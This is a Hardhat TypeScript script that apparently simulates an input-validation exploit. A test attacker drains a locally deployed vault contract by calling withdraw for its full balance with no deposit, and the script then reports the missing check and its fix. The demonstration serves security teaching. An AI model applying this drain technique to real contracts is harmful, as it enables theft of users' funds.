import hre from "hardhat";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const startTime = Date.now();
  const [deployer, attacker] = await hre.ethers.getSigners();

  const VictimFactory = await hre.ethers.getContractFactory("InputValidationVictim");
  const victim = await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  // Seed vault
  await (victim as any).connect(deployer).deposit({ value: parseEther("5") });
  const initialBalance: bigint = await (victim as any).getBalance();

  const AttackerFactory = await hre.ethers.getContractFactory("InputValidationAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  // Encode withdraw(fullBalance) — attacker deposited 0
  const callData = (victim as any).interface.encodeFunctionData("withdraw", [initialBalance]);

  const t1 = Date.now();
  await (attackerContract as any).connect(attacker).attack(victimAddress, callData);
  const endTime = Date.now();

  const finalBalance: bigint = await (victim as any).getBalance();
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await (attackerContract as any).getBalance();

  const result = buildResult({
    contractName: "InputValidationVictim",
    contractAddress: victimAddress,
    attackType: "inputvalidation",
    targetFunction: "withdraw(uint256)",
    severity: "High",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: "Legitimate user deposits 5 ETH into vault",
        from: deployer.address,
        to: victimAddress,
        value: "5.0",
        unit: "ETH",
        timestampMs: t1 - 100,
        balanceAfter: { victim: "5.0", attacker: "0.0" },
      },
      {
        step: 2,
        description: `Attacker calls withdraw(${formatEther(initialBalance)} ETH) — deposited 0`,
        from: attacker.address,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: {
          victim: formatEther(finalBalance),
          attacker: formatEther(attackerBal),
        },
      },
    ],
    timeline: [
      "InputValidationVictim deployed",
      "Victim vault seeded with 5 ETH by depositor",
      "Attacker deposited: 0 ETH",
      `Attacker called withdraw(${formatEther(initialBalance)})`,
      "No deposit balance check — transfer succeeds",
      "Vault drained",
    ],
    report: {
      vulnerabilityType: "Input Validation",
      affectedFunction: "withdraw(uint256)",
      explanation:
        "withdraw() checks that amount > 0 and the contract has enough ETH, but never verifies deposits[msg.sender] >= amount. Any caller can withdraw the full vault balance without having deposited anything.",
      fix: "Add require(deposits[msg.sender] >= amount, 'Exceeds your deposit') before transferring ETH.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
